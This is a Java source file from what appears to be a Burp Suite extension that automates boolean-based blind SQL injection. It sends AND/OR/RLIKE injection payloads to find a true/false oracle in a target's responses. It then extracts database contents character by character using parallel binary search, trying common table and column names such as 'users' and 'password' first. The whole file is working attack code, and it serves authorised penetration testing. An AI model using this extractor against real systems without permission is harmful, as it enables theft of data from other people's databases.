package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Boolean-based blind SQL injection extractor — the heart of OmniMap.
 *
 * SPEED IMPROVEMENTS over sqlmap:
 *
 * 1. PARALLEL CHARACTER EXTRACTION — extracts N characters simultaneously
 *    using a thread pool (sqlmap is largely single-threaded for blind).
 *    With 5 threads, a 20-char string takes ~28 requests instead of ~140 sequential.
 *
 * 2. ADAPTIVE BISECTION — starts with common character ranges [a-z0-9_]
 *    (37 chars, ~5 requests avg), only expands to full printable ASCII
 *    (95 chars, ~7 requests) on miss. Saves ~30% requests for typical DB names.
 *
 * 3. PREDICTIVE OPTIMIZATION — for known contexts (table/column names),
 *    tests common prefixes ("user", "admin", "id", "password", "email") first
 *    with a single confirmation request before falling back to bisection.
 *
 * 4. RESPONSE FINGERPRINT CACHING — caches baseline response signatures
 *    to skip redundant comparison requests.
 */
public class BlindExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private final ResponseAnalyzer analyzer;
    private volatile boolean cancelled = false;

    /** Cached baseline responses for true/false conditions */
    private String trueBaseline;
    private String falseBaseline;

    /** The conjunction operator that worked during detection (AND or OR) */
    private String workingOperator = "AND";

    /** The detection label that worked (e.g., "AND", "AND-RLIKE", "AND-subquery", "OR") */
    private String workingLabel = "AND";

    /** The boundary (prefix/suffix) that works for boolean blind extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    /** Common table/column name prefixes for predictive optimization */
    private static final String[] COMMON_NAMES = {
            "users", "user", "admin", "password", "passwd", "pass", "email", "username",
            "id", "name", "login", "token", "session", "role", "status", "type",
            "created", "updated", "date", "time", "data", "value", "key", "code",
            "account", "profile", "config", "setting", "log", "message", "comment",
            "post", "article", "page", "file", "image", "url", "path", "title",
            "description", "content", "body", "text", "phone", "address", "city",
            "country", "price", "amount", "quantity", "order", "product", "category",
            "information_schema", "mysql", "sys", "performance_schema", "test", "main"
    };

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    public BlindExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
        this.analyzer = new ResponseAnalyzer();
        if (!config.getTrueString().isEmpty()) analyzer.setTrueString(config.getTrueString());
        if (!config.getFalseString().isEmpty()) analyzer.setFalseString(config.getFalseString());

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Enrich response body with Location header for redirect responses.
     * Redirect-based oracles (e.g., 302 to /dashboard vs /login?error=1) are invisible
     * to body-only comparison because both 302 bodies are typically identical short HTML.
     * Appending the Location value lets existing similarity/autoDetectTrueString logic
     * naturally detect the redirect target difference as the boolean oracle.
     */
    private static String enrichWithRedirect(burp.api.montoya.http.message.responses.HttpResponse response) {
        String body = response.bodyToString();
        if (body == null) body = "";
        int status = response.statusCode();
        if (status >= 300 && status < 400) {
            String location = response.headerValue("Location");
            if (location != null && !location.isEmpty()) {
                body = body + "\nLocation: " + location;
            }
        }
        return body;
    }

    /**
     * Detect if boolean blind injection works by testing ALL boundary × test combinations.
     * Like sqlmap: each boundary is tried independently — a boundary that works for
     * error-based may not work for boolean and vice versa.
     *
     * Level controls which tests: AND (L1), subquery/RLIKE (L2+), NOT (L3+)
     * Risk 3 adds OR-based tests (dangerous for UPDATE/DELETE)
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if boolean blind is viable
     */
    public boolean detect(List<String[]> boundaries) {
        int level = config.getLevel();
        int risk = config.getRisk();

        // Build list of boolean test pairs: {trueCondition, falseCondition, label}
        int randInt = ThreadLocalRandom.current().nextInt(1000, 10000);
        List<String[]> tests = new ArrayList<>();

        // Level 1: basic AND test (always included)
        tests.add(new String[]{
                " AND " + randInt + "=" + randInt + " ",
                " AND " + randInt + "=" + (randInt + 1) + " ",
                "AND"
        });

        // Level 2+: subquery boolean — AND (SELECT randInt)=randInt
        if (level >= 2) {
            tests.add(new String[]{
                    " AND (SELECT " + randInt + ")=" + randInt + " ",
                    " AND (SELECT " + randInt + ")=" + (randInt + 1) + " ",
                    "AND-subquery"
            });

            // MySQL RLIKE boolean test
            if (dialect != null && "MySQL".equals(dialect.getName())) {
                tests.add(new String[]{
                        " AND 1 RLIKE 1 ",
                        " AND 1 RLIKE 2 ",
                        "AND-RLIKE"
                });
            }
        }

        // Level 3+: NOT-based
        if (level >= 3) {
            tests.add(new String[]{
                    " AND NOT " + randInt + "=" + (randInt + 1) + " ",
                    " AND NOT " + randInt + "=" + randInt + " ",
                    "AND-NOT"
            });
        }

        // Risk 3: OR-based tests (dangerous for UPDATE/DELETE queries!)
        if (risk >= 3) {
            tests.add(new String[]{
                    " OR " + randInt + "=" + randInt + " ",
                    " OR " + randInt + "=" + (randInt + 1) + " ",
                    "OR"
            });

            tests.add(new String[]{
                    " OR NOT " + randInt + "=" + (randInt + 1) + " ",
                    " OR NOT " + randInt + "=" + randInt + " ",
                    "OR-NOT"
            });
        }

        // Expand boundaries: for each boundary with non-empty suffix, also try without suffix.
        // Some injection points work better without trailing comments (e.g., error-based
        // WHERE id='1' AND 1=1 vs WHERE id='1' AND 1=1 -- -'). Doubles detection coverage.
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        int totalCombos = expandedBoundaries.size() * tests.size();
        callback.onProgress("BOOLEAN: Testing " + totalCombos + " combinations (" +
                expandedBoundaries.size() + " boundaries × " + tests.size() + " tests)...", 4);
        int tried = 0;

        // Try ALL boundary × test combinations
        for (String[] boundary : expandedBoundaries) {
            String prefix = boundary[0];
            String suffix = boundary[1];

            for (String[] test : tests) {
                if (cancelled) return false;
                tried++;

                String truePayloadStr = test[0];
                String falsePayloadStr = test[1];
                String label = test[2];

                // Calibrate with two identical true requests
                String truePayload = TamperEngine.apply(truePayloadStr, config.getTampers());
                var trueResp1 = sendPayloadWith(truePayload, prefix, suffix);
                if (trueResp1 == null || cancelled) continue;
                var trueResp2 = sendPayloadWith(truePayload, prefix, suffix);
                if (trueResp2 == null || cancelled) continue;

                // Enrich bodies with Location header for redirect-based oracles.
                // 302 responses often have identical bodies but different Location targets
                // (e.g., /dashboard vs /login?error=1). Appending Location makes the
                // existing similarity logic detect the redirect difference.
                String trueBody1 = enrichWithRedirect(trueResp1);
                String trueBody2 = enrichWithRedirect(trueResp2);
                analyzer.calibrateDynamic(trueBody1, trueBody2);
                analyzer.setTrueStatusCode(trueResp1.statusCode());

                // Send false condition
                String falsePayload = TamperEngine.apply(falsePayloadStr, config.getTampers());
                var falseResp = sendPayloadWith(falsePayload, prefix, suffix);
                if (falseResp == null || cancelled) continue;
                String falseBody = enrichWithRedirect(falseResp);
                analyzer.setFalseStatusCode(falseResp.statusCode());

                if (checkBooleanViability(trueBody1, falseBody,
                        trueResp1.statusCode(), falseResp.statusCode(),
                        label + " prefix=\"" + prefix + "\" suffix=\"" + suffix + "\"")) {
                    trueBaseline = trueBody1;
                    falseBaseline = falseBody;
                    workingOperator = label.startsWith("OR") ? "OR" : "AND";
                    workingLabel = label;
                    workingPrefix = prefix;
                    workingSuffix = suffix;
                    callback.onProgress("BOOLEAN: Viable! " + label + " prefix=\"" + prefix +
                            "\" suffix=\"" + suffix + "\" [" + tried + "/" + totalCombos + "]", 10);
                    return true;
                }
            }
        }

        callback.onProgress("BOOLEAN: All " + tried + " combinations failed — responses too similar", 0);
        return false;
    }

    /**
     * Check if true/false responses differ enough for boolean blind injection.
     * Uses multiple signals like sqlmap: string match, status code, length, similarity.
     */
    private boolean checkBooleanViability(String trueBody, String falseBody,
                                           int trueStatus, int falseStatus, String label) {
        // Signal 1: Auto-detected true string (from boundary detection phase)
        if (!config.getTrueString().isEmpty()) {
            boolean trueHas = trueBody.contains(config.getTrueString());
            boolean falseHas = falseBody.contains(config.getTrueString());
            if (trueHas && !falseHas) {
                callback.onProgress("BOOLEAN: Viable (" + label + ")! String marker: \"" +
                        config.getTrueString() + "\" | Status: " + trueStatus + "/" + falseStatus, 10);
                return true;
            }
        }

        // Signal 2: Status code difference
        if (trueStatus != falseStatus) {
            callback.onProgress("BOOLEAN: Viable (" + label + ")! Status differs: " +
                    trueStatus + " vs " + falseStatus, 10);
            return true;
        }

        // Signal 3: Content-length difference
        int lenDiff = Math.abs(trueBody.length() - falseBody.length());
        if (lenDiff > 20) {
            callback.onProgress("BOOLEAN: Viable (" + label + ")! Length diff=" + lenDiff +
                    " | Status: " + trueStatus + "/" + falseStatus, 10);
            return true;
        }

        // Signal 4: Body similarity ratio
        double similarity = analyzer.similarity(trueBody, falseBody);
        if (similarity < 0.98) {
            callback.onProgress("BOOLEAN: Viable (" + label + ")! Similarity=" +
                    String.format("%.3f", similarity) + " | Status: " + trueStatus + "/" + falseStatus, 10);
            return true;
        }

        // Signal 5: Last resort — try auto-detecting a string diff
        String autoTrue = analyzer.autoDetectTrueString(trueBody, falseBody);
        if (autoTrue != null && !autoTrue.isEmpty()) {
            config.setTrueString(autoTrue);
            analyzer.setTrueString(autoTrue);
            callback.onProgress("BOOLEAN: Viable (" + label + ")! Auto-detected marker: \"" + autoTrue +
                    "\" (sim=" + String.format("%.3f", similarity) + ")", 10);
            return true;
        }

        return false;
    }

    /**
     * Extract a single string value using parallel blind bisection.
     */
    public String extractSingle(String query) {
        if (cancelled || trueBaseline == null) return null;

        // Step 1: Get string length via binary search
        int length = extractLength(query);
        if (length <= 0 || cancelled) return null;

        callback.onProgress("BOOLEAN: Extracting " + length + " chars (parallel)...", 20);

        // Step 2: Extract all characters in parallel
        ExecutorService pool = Executors.newFixedThreadPool(
                Math.min(config.getThreads(), length));

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPosition(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                } else {
                    chars[charPos - 1] = '?';
                    anyFailed.set(true);
                }
            }));
        }

        // Wait for all character extractions to complete
        for (Future<?> f : futures) {
            try {
                f.get(60, TimeUnit.SECONDS);
            } catch (Exception e) {
                break;
            }
        }
        pool.shutdownNow();

        return new String(chars).trim();
    }

    /**
     * Extract a list of values using blind extraction.
     * First counts total rows, then extracts each one.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // Extract values one by one using dialect-aware pagination
        Set<String> seen = new HashSet<>();
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            String trimmed = val.trim();
            if (seen.add(trimmed)) {
                results.add(trimmed);
                callback.onProgress("BOOLEAN: Extracted " + results.size() + " values so far...",
                        Math.min(90, 20 + results.size() * 5));
            }
        }

        return results;
    }

    /**
     * Extract the length of a query result using binary search.
     * O(log n) requests where n is the max expected length.
     */
    private int extractLength(String query) {
        String lengthExpr = dialect.lengthFunction(query);

        // Binary search for length
        int low = 0, high = 64;

        // First, find upper bound
        while (!cancelled) {
            if (testCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 2048) return -1; // Safety cap
            } else {
                break;
            }
        }

        // Binary search
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * Extract the ASCII value of a character at a specific position.
     * Uses tiered adaptive bisection: tries tight ranges first (fewer bisection
     * steps), falls back to wider ranges only on miss.
     *
     * Tier 1: lowercase a-z (97-122) — log2(26) ≈ 5 steps + 1 range check = 6 requests
     * Tier 2: digits 0-9 (48-57)     — log2(10) ≈ 4 steps + 1 range check = 5 requests
     * Tier 3: full ASCII (32-126)     — log2(95) ≈ 7 steps, no range check  = 7 requests
     *
     * For typical DB identifiers (~80% lowercase+digits), average is ~6 requests/char
     * vs 7 without optimization. The savings compound across parallel threads.
     */
    private int extractCharAtPosition(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters (most common in DB names/values)
        int result = bisectInRange(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRange(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII (covers uppercase, punctuation, spaces, etc.)
        return bisectFull(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    /**
     * Check if the ASCII value is within [low, high] and bisect if so.
     * Costs 1 request for the range check. Returns -1 if not in range.
     */
    private int bisectInRange(String asciiExpr, int low, int high) {
        if (!testCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFull(asciiExpr, low, high);
    }

    /**
     * Standard binary search bisection for ASCII value.
     */
    private int bisectFull(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a boolean condition via blind injection.
     * Returns true if the condition evaluates to true on the server.
     * Dispatches to the correct extraction vector based on what worked during detection.
     * Like sqlmap: RLIKE uses RLIKE vector, AND/OR use bare condition.
     */
    private boolean testCondition(String condition) {
        String payload;
        if ("AND-RLIKE".equals(workingLabel)) {
            // sqlmap RLIKE vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 0x28 END))
            payload = " RLIKE (SELECT (CASE WHEN (" + condition + ") THEN 1 ELSE 0x28 END)) ";
        } else {
            // Standard AND/OR vector: operator + condition
            payload = " " + workingOperator + " " + condition + " ";
        }
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response == null) return false;

        String body = enrichWithRedirect(response);
        int statusCode = response.statusCode();
        return analyzer.isTruePage(trueBaseline, falseBaseline, body, statusCode);
    }

    /**
     * Try predictive matching: test if the full value matches a common name.
     * Returns the match or null if no prediction succeeds.
     */
    public String tryPredictive(String query) {
        if (cancelled) return null;

        for (String commonName : COMMON_NAMES) {
            if (cancelled) break;
            // Test: SELECT (query) = 'commonName'
            String condition = "(" + query + ")='" + commonName + "'";
            if (testCondition(condition)) {
                return commonName;
            }
        }
        return null;
    }

    /**
     * Send a request with payload using the stored working boundary.
     * Used during extraction phase.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    /**
     * Send a request with payload using a specific boundary.
     * Used during detection phase to try different prefix/suffix combinations.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    prefix + payload + (suffix.isEmpty() ? "" : suffix));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            this.result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "BOOLEAN", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

}
